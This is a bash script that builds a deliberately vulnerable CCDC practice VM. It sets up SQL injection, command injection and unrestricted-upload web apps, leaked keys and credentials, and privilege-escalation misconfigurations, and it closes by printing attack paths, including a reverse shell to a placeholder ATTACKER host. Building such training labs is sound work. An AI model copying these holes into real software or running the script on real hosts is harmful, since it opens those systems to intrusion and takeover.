#!/bin/bash
# CCDC Practice VM Setup Script
# Run as root on a fresh Ubuntu 22.04 VM
# Usage: bash setup-vm.sh

set -e
export DEBIAN_FRONTEND=noninteractive

echo "=== [1/10] Updating system ==="
apt-get update -q
apt-get install -y -q \
  apache2 php php-mysqli libapache2-mod-php \
  mysql-server \
  vsftpd \
  samba \
  openssh-server \
  python3 python3-pip \
  net-tools curl wget git vim \
  cron

pip3 install flask --quiet

echo "=== [2/10] Configuring MySQL ==="
systemctl start mysql
mysql -e "CREATE DATABASE IF NOT EXISTS webapp;"
mysql -e "CREATE USER IF NOT EXISTS 'webuser'@'localhost' IDENTIFIED BY 'webpass123';"
mysql -e "GRANT ALL ON webapp.* TO 'webuser'@'localhost';"
mysql -e "FLUSH PRIVILEGES;"
mysql webapp <<'SQL'
CREATE TABLE IF NOT EXISTS users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(64),
  password VARCHAR(64),
  role VARCHAR(16) DEFAULT 'user'
);
INSERT IGNORE INTO users (username, password, role) VALUES
  ('admin', 'sup3rs3cr3t!', 'admin'),
  ('john',  'password123',  'user'),
  ('alice', 'alice2024',    'user');
SQL

echo "=== [3/10] Setting up Apache + SQLi login page ==="
a2enmod rewrite php8.1 2>/dev/null || true
cat > /var/www/html/index.php <<'PHP'
<?php
$msg = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $conn = new mysqli('localhost', 'webuser', 'webpass123', 'webapp');
    // VULNERABLE: raw string interpolation
    $sql  = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
    $res  = $conn->query($sql);
    if ($res && $res->num_rows > 0) {
        $row  = $res->fetch_assoc();
        $msg  = "<div class='ok'>Welcome, {$row['username']}! Role: {$row['role']}</div>";
    } else {
        $msg = "<div class='err'>Invalid credentials.</div>";
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>Welcome to CorpNet Portal</title>
<style>
  body{font-family:sans-serif;background:#1a1a2e;color:#eee;display:flex;justify-content:center;padding-top:80px}
  .box{background:#16213e;padding:40px;border-radius:8px;width:340px}
  h2{text-align:center;color:#00d4ff}
  input{width:100%;padding:8px;margin:8px 0;border-radius:4px;border:1px solid #444;background:#0f3460;color:#eee}
  button{width:100%;padding:10px;background:#00d4ff;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
  .ok{color:#39ff14;margin-top:10px}.err{color:#ff2d78;margin-top:10px}
</style></head>
<body>
<div class="box">
  <h2>CorpNet Portal</h2>
  <form method="POST">
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button type="submit">Login</button>
  </form>
  <?= $msg ?>
</div>
</body></html>
PHP

# Backup directory with exposed files
mkdir -p /var/www/html/backup

# Generate SSH key for 'devops' user (leaked via web)
useradd -m -s /bin/bash devops 2>/dev/null || true
echo 'devops:devops123' | chpasswd
mkdir -p /home/devops/.ssh
ssh-keygen -t rsa -b 2048 -f /home/devops/.ssh/id_rsa -N "" -q
cp /home/devops/.ssh/id_rsa.pub /home/devops/.ssh/authorized_keys
chmod 600 /home/devops/.ssh/authorized_keys
chown -R devops:devops /home/devops/.ssh

# Copy private key to web-exposed backup directory
cp /home/devops/.ssh/id_rsa /var/www/html/backup/id_rsa
cat > /var/www/html/backup/db_config.php.bak <<'EOF'
<?php
// Database configuration backup - DO NOT COMMIT
define('DB_HOST', 'localhost');
define('DB_USER', 'webuser');
define('DB_PASS', 'webpass123');
define('DB_NAME', 'webapp');
?>
EOF

# Enable directory listing for /backup/
cat > /var/www/html/backup/.htaccess <<'EOF'
Options +Indexes
EOF

chown -R www-data:www-data /var/www/html
chmod 644 /var/www/html/backup/id_rsa

echo "=== [4/10] Setting up command injection app (port 8080) ==="
mkdir -p /opt/netdiag
cat > /opt/netdiag/index.php <<'PHP'
<?php
$output = '';
if (isset($_GET['host']) && $_GET['host'] !== '') {
    // VULNERABLE: unsanitised input passed to shell
    $host   = $_GET['host'];
    $output = shell_exec("ping -c 2 " . $host . " 2>&1");
}
?>
<!DOCTYPE html>
<html>
<head><title>Network Diagnostics</title>
<style>
  body{font-family:monospace;background:#0d1117;color:#c8f0ff;padding:40px}
  h1{color:#00d4ff}
  input{padding:8px;width:320px;background:#161b22;border:1px solid #30363d;color:#fff;border-radius:4px}
  button{padding:8px 20px;background:#00d4ff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}
  pre{background:#161b22;padding:20px;border-radius:4px;margin-top:20px;white-space:pre-wrap}
</style></head>
<body>
<h1>Network Diagnostics Tool</h1>
<form method="GET">
  <input name="host" placeholder="Enter hostname or IP" value="<?= htmlspecialchars($_GET['host'] ?? '') ?>">
  <button type="submit">Ping</button>
</form>
<?php if ($output): ?>
<pre><?= htmlspecialchars($output) ?></pre>
<?php endif; ?>
</body></html>
PHP

# Run on port 8080 via Apache virtual host
cat > /etc/apache2/sites-available/netdiag.conf <<'APACHECONF'
<VirtualHost *:8080>
    DocumentRoot /opt/netdiag
    <Directory /opt/netdiag>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
</VirtualHost>
APACHECONF

echo "Listen 8080" >> /etc/apache2/ports.conf
a2ensite netdiag.conf
chown -R www-data:www-data /opt/netdiag

echo "=== [5/10] Setting up file upload RCE app (port 8888) ==="
mkdir -p /opt/uploadapp/uploads
cat > /opt/uploadapp/app.py <<'PYTHON'
from flask import Flask, request, redirect, url_for, send_from_directory
import os

app = Flask(__name__)
UPLOAD_FOLDER = '/opt/uploadapp/uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def index():
    files = os.listdir(UPLOAD_FOLDER)
    file_list = ''.join(f'<li><a href="/uploads/{f}">{f}</a></li>' for f in files)
    return f'''<!DOCTYPE html>
<html><head><title>CorpNet Image Gallery</title>
<style>
  body{{font-family:sans-serif;background:#0d1117;color:#c8f0ff;padding:40px}}
  h1{{color:#00d4ff}} input,button{{margin:4px;padding:8px}}
  button{{background:#00d4ff;border:none;border-radius:4px;cursor:pointer;font-weight:bold}}
  ul{{margin-top:20px}}
</style></head>
<body>
<h1>Upload Profile Image</h1>
<form method="POST" action="/upload" enctype="multipart/form-data">
  <input type="file" name="file">
  <button type="submit">Upload</button>
</form>
<h2>Uploaded Files</h2>
<ul>{file_list}</ul>
</body></html>'''

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files.get('file')
    if f:
        # VULNERABLE: no extension or MIME validation
        f.save(os.path.join(app.config['UPLOAD_FOLDER'], f.filename))
    return redirect('/')

@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)
PYTHON

chown -R www-data:www-data /opt/uploadapp

# Systemd service for Flask app
cat > /etc/systemd/system/uploadapp.service <<'UNIT'
[Unit]
Description=CorpNet Upload App
After=network.target

[Service]
User=www-data
WorkingDirectory=/opt/uploadapp
ExecStart=/usr/bin/python3 /opt/uploadapp/app.py
Restart=always

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable uploadapp
systemctl start uploadapp

echo "=== [6/10] Configuring FTP (anonymous + weak creds) ==="
cat > /etc/vsftpd.conf <<'FTPCONF'
listen=YES
listen_ipv6=NO
anonymous_enable=YES
anon_root=/srv/ftp
local_enable=YES
write_enable=NO
local_umask=022
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
FTPCONF

mkdir -p /srv/ftp
cat > /srv/ftp/README.txt <<'EOF'
CorpNet Internal FTP
====================
Deployment credentials (do not share):
  ssh_user: deploy
  ssh_pass: deploy

DB backup: db_config.php.bak (see web /backup/)
EOF
chmod 755 /srv/ftp
chmod 644 /srv/ftp/README.txt

# Weak local account
useradd -m -s /bin/bash deploy 2>/dev/null || true
echo 'deploy:deploy' | chpasswd

systemctl restart vsftpd

echo "=== [7/10] Configuring Samba (null session share) ==="
cat >> /etc/samba/smb.conf <<'SAMBACNF'

[corpshare]
   path = /srv/samba/corpshare
   browseable = yes
   read only = yes
   guest ok = yes
   comment = CorpNet Shared Files

[homes]
   comment = Home Directories
   browseable = no
   read only = no
   valid users = %S
SAMBACNF

mkdir -p /srv/samba/corpshare
cat > /srv/samba/corpshare/internal_notes.txt <<'EOF'
IT Admin Notes
==============
Default root password changed to: R00tM3N0w!
devops account key stored at: /var/www/html/backup/id_rsa
MySQL root is passwordless (localhost only)
EOF
chmod 755 /srv/samba/corpshare
chmod 644 /srv/samba/corpshare/internal_notes.txt

systemctl restart smbd nmbd 2>/dev/null || true

echo "=== [8/10] Configuring privilege escalation vectors ==="

# PrivEsc 1: SUID on python3
chmod u+s /usr/bin/python3

# PrivEsc 2: Sudo misconfiguration for deploy user
cat >> /etc/sudoers <<'SUDOERS'
deploy ALL=(ALL) NOPASSWD: /usr/bin/vim
www-data ALL=(ALL) NOPASSWD: /usr/bin/python3
SUDOERS

# PrivEsc 3: World-writable cron script run as root
mkdir -p /opt/scripts
cat > /opt/scripts/cleanup.sh <<'CRONSCRIPT'
#!/bin/bash
find /tmp -type f -mtime +1 -delete
CRONSCRIPT
chmod 777 /opt/scripts/cleanup.sh
echo "* * * * * root /opt/scripts/cleanup.sh" >> /etc/cron.d/cleanup

# PrivEsc 4: World-writable /etc/passwd
chmod 666 /etc/passwd

# PrivEsc 5 (bonus): docker socket if docker is installed
if command -v docker &>/dev/null; then
    usermod -aG docker deploy
    usermod -aG docker devops
fi

echo "=== [9/10] Opening firewall ports ==="
# Allow everything for lab environment
ufw disable 2>/dev/null || true

echo "=== [10/10] Restarting all services ==="
systemctl restart apache2
systemctl restart vsftpd
systemctl restart ssh
systemctl restart uploadapp 2>/dev/null || true

echo ""
echo "============================================================"
echo "  SETUP COMPLETE"
echo "============================================================"
echo ""
echo "SCORABLE SERVICES:"
echo "  HTTP main site    : http://TARGET/           (port 80)"
echo "  HTTP cmd inject   : http://TARGET:8080/      (port 8080)"
echo "  HTTP file upload  : http://TARGET:8888/      (port 8888)"
echo "  HTTP backup leak  : http://TARGET/backup/    (port 80)"
echo "  SSH               : port 22 (user: deploy / deploy)"
echo "  FTP               : port 21 (anonymous)"
echo "  Samba             : port 445 (null session)"
echo ""
echo "INITIAL ACCESS PATHS:"
echo "  1. FTP anon -> README.txt -> SSH as deploy:deploy"
echo "  2. SQLi on port 80 -> dump creds or write webshell"
echo "  3. HTTP /backup/id_rsa -> SSH as devops"
echo "  4. Samba null session -> internal_notes.txt -> creds"
echo "  5. Command injection port 8080 -> RCE as www-data"
echo "  6. File upload port 8888 -> upload shell.php -> RCE"
echo ""
echo "PRIVILEGE ESCALATION PATHS:"
echo "  1. SUID python3: python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
echo "  2. sudo vim (deploy): sudo vim -c ':!/bin/bash'"
echo "  3. Writable cron: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /opt/scripts/cleanup.sh"
echo "  4. World-writable /etc/passwd: append 'pwned::0:0::/root:/bin/bash'"
echo "  5. (if docker) docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash"
echo ""
echo "SCORING APP CONFIG (per team instance):"
echo "  Profile: 'CorpNet Box'"
echo "  App 1  : Apache     | HTTP  | port 80   | path /        | contains 'Welcome'        | 100pts"
echo "  App 2  : SSH        | SSH   | port 22   | user deploy   | pass deploy               | 150pts"
echo "  App 3  : FTP Banner | TCP   | port 21   | contains '220'                            | 75pts"
echo "  App 4  : Samba      | TCP   | port 445  | (no string)                               | 75pts"
echo "  App 5  : NetDiag    | HTTP  | port 8080 | path /        | contains 'Network Diag'   | 100pts"
echo "  App 6  : UploadApp  | HTTP  | port 8888 | path /        | contains 'Upload'         | 100pts"
echo "  App 7  : Backup     | HTTP  | port 80   | path /backup/ | contains 'Index of'       | 75pts"
echo "============================================================"
